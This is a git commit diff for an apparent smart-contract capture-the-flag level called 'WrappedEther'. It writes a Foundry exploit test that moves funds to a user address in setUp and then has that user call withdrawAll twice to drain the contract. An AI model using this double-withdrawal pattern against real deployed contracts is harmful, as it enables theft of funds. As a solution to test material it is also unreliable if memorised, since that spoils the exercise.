5b9dff5ec0a214cdbf325004147dd7ac27206888
ulianovikova <yasenevsk.18@gmail.com>
2024-10-22 21:44:14 +0300

    13

--- test/13_WrappedEther.t.sol
+++ test/13_WrappedEther.t.sol
@@ -7,16 +7,24 @@ import "src/13_WrappedEther/WrappedEther.sol";
 // forge test --match-contract WrappedEtherTest
 contract WrappedEtherTest is BaseTest {
     WrappedEther instance;
+    address user = address(0x123);
 
     function setUp() public override {
         super.setUp();
 
         instance = new WrappedEther();
         instance.deposit{value: 0.09 ether}(address(this));
+        instance.transfer(user, 0.09 ether);
     }
 
     function testExploitLevel() public {
         /* YOUR EXPLOIT GOES HERE */
+
+        vm.prank(user);
+        instance.withdrawAll();
+
+        vm.prank(user);
+        instance.withdrawAll();
 
         checkSuccess();
     }
